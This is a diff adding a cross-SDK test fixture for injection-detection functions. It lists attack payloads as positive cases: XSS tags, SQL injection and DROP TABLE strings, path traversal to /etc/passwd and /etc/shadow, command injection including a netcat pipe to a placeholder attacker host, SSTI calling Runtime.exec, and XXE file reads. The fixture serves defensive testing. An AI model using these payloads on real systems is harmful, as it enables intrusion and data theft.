@@ -610,5 +610,93 @@
         }
       ]
     }
+  },
+
+  "detect_parity": {
+    "description": "Cross-SDK detection-function parity. Each payload must classify under the listed vector when fed through detect_xss / detect_sql / detect_path_traversal / detect_command_injection / detect_nosql / detect_prototype_pollution / detect_ssti / detect_xxe in every SDK. Catches divergence between Node hardcoded patterns and Python's patterns.json source. Negative cases (clean inputs, sink-context strings) ensure each detector stays narrow.",
+
+    "xss_positive": [
+      { "input": "<script>alert(1)</script>", "expected": true },
+      { "input": "<SCRIPT>alert(1)</SCRIPT>", "expected": true },
+      { "input": "<img src=x onerror=alert(1)>", "expected": true },
+      { "input": "<svg onload=alert(1)>", "expected": true },
+      { "input": "javascript:alert(1)", "expected": true },
+      { "input": "vbscript:msgbox(1)", "expected": true },
+      { "input": "<iframe src=evil.com></iframe>", "expected": true },
+      { "input": "<form action=https://evil.com>", "expected": true },
+      { "input": "<meta http-equiv=refresh content=0;url=evil>", "expected": true },
+      { "input": "<base href=https://evil.com>", "expected": true },
+      { "input": "<link rel=stylesheet href=evil.css>", "expected": true },
+      { "input": "<object data=evil.swf>", "expected": true },
+      { "input": "<embed src=evil.swf>", "expected": true },
+      { "input": "%3Cscript%3Ealert(1)%3C/script%3E", "expected": true },
+      { "input": "<style>body{behavior:url(evil.htc)}</style>", "expected": true }
+    ],
+    "xss_negative": [
+      { "input": "Hello world", "expected": false },
+      { "input": "user@example.com", "expected": false },
+      { "input": "metadata: useful info", "expected": false },
+      { "input": "I love (parentheses) in text", "expected": false },
+      { "input": "5 < 10 and 10 > 5", "expected": false }
+    ],
+
+    "sql_positive": [
+      { "input": "1 OR 1=1", "expected": true },
+      { "input": "' OR '1'='1' --", "expected": true },
+      { "input": "1; DROP TABLE users", "expected": true },
+      { "input": "UNION SELECT password FROM users", "expected": true },
+      { "input": "1' AND SLEEP(5)--", "expected": true },
+      { "input": "1; WAITFOR DELAY '0:0:5'--", "expected": true },
+      { "input": "1 AND BENCHMARK(1000000,MD5(1))", "expected": true }
+    ],
+    "sql_negative": [
+      { "input": "Hello world", "expected": false },
+      { "input": "alice@example.com", "expected": false },
+      { "input": "id=1234", "expected": false }
+    ],
+
+    "path_positive": [
+      { "input": "../../etc/passwd", "expected": true },
+      { "input": "..\\..\\windows\\system32", "expected": true },
+      { "input": "%2e%2e/etc/passwd", "expected": true },
+      { "input": "....//etc/passwd", "expected": true },
+      { "input": "../../../../etc/shadow%00", "expected": true }
+    ],
+    "path_negative": [
+      { "input": "/api/users/123", "expected": false },
+      { "input": "Hello world", "expected": false },
+      { "input": "ratio is 1/2", "expected": false }
+    ],
+
+    "command_positive": [
+      { "input": "; ls -la", "expected": true },
+      { "input": "$(whoami)", "expected": true },
+      { "input": "`id`", "expected": true },
+      { "input": "&& cat /etc/passwd", "expected": true },
+      { "input": "| nc evil.com 4444", "expected": true }
+    ],
+    "command_negative": [
+      { "input": "Hello world", "expected": false },
+      { "input": "alice@example.com", "expected": false },
+      { "input": "user 5 + 5 = 10", "expected": false }
+    ],
+
+    "ssti_positive": [
+      { "input": "{{ 7 * 7 }}", "expected": true },
+      { "input": "{{config.SECRET_KEY}}", "expected": true },
+      { "input": "${T(java.lang.Runtime).getRuntime().exec('id')}", "expected": true }
+    ],
+    "ssti_negative": [
+      { "input": "Hello world", "expected": false },
+      { "input": "Mass: 5 kg", "expected": false }
+    ],
+
+    "xxe_positive": [
+      { "input": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "expected": true },
+      { "input": "<!ENTITY xxe SYSTEM 'http://evil.com/'>", "expected": true }
+    ],
+    "xxe_negative": [
+      { "input": "<note><body>Hello</body></note>", "expected": false }
+    ]
   }
 }
